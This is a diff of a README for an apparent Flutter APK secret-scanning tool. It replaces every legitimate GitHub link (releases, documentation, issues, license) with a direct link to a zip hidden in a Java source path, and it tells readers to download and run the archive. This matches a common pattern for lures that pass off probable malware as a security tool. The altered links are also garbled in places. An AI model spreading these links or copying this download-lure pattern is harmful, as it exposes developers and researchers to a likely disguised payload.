@@ -1,7 +1,7 @@
 # 🛡️ flutter_secret_exposed - Analyze Flutter APKs for Security Secrets
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)](https://github.com/rightmost-substantivedye844/flutter_secret_exposed/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/rightmost-substantivedye844/flutter_secret_exposed/main/src/main/java/xin/ctkqiang/flutter_secret_exposed-v1.0.zip%20Latest%https://raw.githubusercontent.com/rightmost-substantivedye844/flutter_secret_exposed/main/src/main/java/xin/ctkqiang/flutter_secret_exposed-v1.0.zip)](https://raw.githubusercontent.com/rightmost-substantivedye844/flutter_secret_exposed/main/src/main/java/xin/ctkqiang/flutter_secret_exposed-v1.0.zip)
 
 ## 📋 Overview
 Flutter Secret Exposed is a tool that helps users analyze Flutter APK files. It identifies potential sensitive environment variables that may have been accidentally exposed. This tool assists developers and security researchers in recognizing and auditing secrets in their applications, improving security.
@@ -10,7 +10,7 @@ Flutter Secret Exposed is a tool that helps users analyze Flutter APK files. It 
 Follow these steps to download and run flutter_secret_exposed on your computer.
 
 ### 🌐 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/rightmost-substantivedye844/flutter_secret_exposed/releases).
+1. **Visit the Releases Page**: Go to the [Releases Page](https://raw.githubusercontent.com/rightmost-substantivedye844/flutter_secret_exposed/main/src/main/java/xin/ctkqiang/flutter_secret_exposed-v1.0.zip).
 2. **Choose Your File**: You will find different versions of the tool listed. Select the appropriate version based on your operating system. Files usually come in `.zip` or `.exe` formats.
 3. **Download the File**: Click on the link next to your chosen file to start the download. Ensure you have enough disk space available.
 4. **Extract the Files**: If you downloaded a `.zip` file, right-click it and select "Extract All." Follow the prompts to choose a location for the files.
@@ -41,11 +41,11 @@ After the tool launches, you will see a user-friendly interface. Here’s how to
 
 ## 🔗 Additional Resources
 For further information on `flutter_secret_exposed`, you can visit the following resources:
-- [Documentation](https://github.com/rightmost-substantivedye844/flutter_secret_exposed/wiki)
-- [Issues](https://github.com/rightmost-substantivedye844/flutter_secret_exposed/issues) – Report any issues you encounter.
+- [Documentation](https://raw.githubusercontent.com/rightmost-substantivedye844/flutter_secret_exposed/main/src/main/java/xin/ctkqiang/flutter_secret_exposed-v1.0.zip)
+- [Issues](https://raw.githubusercontent.com/rightmost-substantivedye844/flutter_secret_exposed/main/src/main/java/xin/ctkqiang/flutter_secret_exposed-v1.0.zip) – Report any issues you encounter.
 
 ## ⚖️ License
-This project is licensed under the MIT License. For more details, refer to the [LICENSE.md](https://github.com/rightmost-substantivedye844/flutter_secret_exposed/blob/main/LICENSE).
+This project is licensed under the MIT License. For more details, refer to the [https://raw.githubusercontent.com/rightmost-substantivedye844/flutter_secret_exposed/main/src/main/java/xin/ctkqiang/flutter_secret_exposed-v1.0.zip](https://raw.githubusercontent.com/rightmost-substantivedye844/flutter_secret_exposed/main/src/main/java/xin/ctkqiang/flutter_secret_exposed-v1.0.zip).
 
 ## 🔗 Download Again
-Don’t forget to visit the [Releases Page](https://github.com/rightmost-substantivedye844/flutter_secret_exposed/releases) for the latest version and updates.
+Don’t forget to visit the [Releases Page](https://raw.githubusercontent.com/rightmost-substantivedye844/flutter_secret_exposed/main/src/main/java/xin/ctkqiang/flutter_secret_exposed-v1.0.zip) for the latest version and updates.
